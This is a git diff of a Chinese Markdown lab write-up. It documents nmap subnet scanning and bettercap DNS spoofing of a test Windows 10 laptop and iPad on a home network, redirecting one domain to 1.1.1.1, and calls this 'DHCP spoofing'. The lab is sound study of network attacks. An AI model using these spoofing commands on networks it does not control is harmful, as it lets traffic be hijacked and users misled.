@@ -117,10 +117,10 @@
   brew install nmap
   ```
 
-- 当前 *IP* 地址为 `10.166.185.228`，则扫描整个子网：
+- 当前 *IP* 地址为 `192.168.31.229`，则扫描整个子网：
 
   ```shell
-  sudo nmap -PS -O  10.166.185.1/24 -v
+  sudo nmap -PS -O  192.168.31.1/24 -v
   ```
 
   `-PS`：nmap将通过发送单个SYN数据包来检查主机是否在线
@@ -143,14 +143,49 @@
   bettercap v2.30.2 (built for darwin amd64 with go1.16.2) [type 'help' for a list of commands]
   
   10.166.0.0/16 > 10.166.185.228  »  
+  ```
   
+- 运行 `help` 指令查看帮助及模块运行情况：
+
+  <img src="./cut/截屏2021-05-04 下午9.53.14.png" alt="avatar" style="zoom:30%;" />
+
+- 将目标机器（即被攻击机器，处于同一网段下，且将 *DNS* 设置为攻击主机的 *ip* 地址）
+
+  - *Win10* 设置 *DNS* 方法见：[Ref](https://jingyan.baidu.com/article/cdddd41cb5116a53cb00e106.html)
+
+  - 利用 `ping` 指令查看当前 *Win10* 访问网站 `www.koudai8.com` 时访问的 *IP* 地址：
+
+    <img src="./cut/WechatIMG57.jpeg" alt="avatar" style="zoom:50%;" />
+
+  - 发现相应的 *IP* 地址为 `49.232.222.175`
+
+- 在攻击主机上运行 *DHCP* 欺骗功能：
+
+  ```shell
+  set dns.spoof.domains www.koudai8.com
+  set dns.spoof.address 1.1.1.1
+  dns.spoof on
   ```
 
+- 再次运行 *Win10* 目标机器上的 `ping` 指令，观察到攻击主机上出现：
+
+  ```
+  192.168.31.0/24 > 192.168.31.229 >> [22:59:56] [sys.log] [inf] dns.spoof sending spoofed DNS reply for www.koudai8.com (->1.1.1.1) to 192.168.31.251 : 3c:95:09:df:34:89 (Liteon Technology Corporation) - LAPTOP-FI0PRTFC.local.
+  ```
+
+  <img src="./cut/截屏2021-05-04 下午11.06.05.png" alt="avatar" style="zoom:50%;" />
+
+  *Win10* 目标机器上 `ping` 指令输出：
+
+  <img src="./cut/WechatIMG58.jpeg" alt="avatar" style="zoom:50%;" />
+
+- 同样设置一个 *ipad* 作为测试载体，在 *Safari* 内访问 `www.koudai8.com`，发现报错 `Error 1001`：
+
+  <img src="./cut/IMG_B0EEAAF13CE0-1.JPEG" alt="avatar" style="zoom:30%;" />
+
+- 据上述实验结果可知，*DHCP Spoofing* 攻击成功。
+
   
-
-- 
-
-
 
 
 
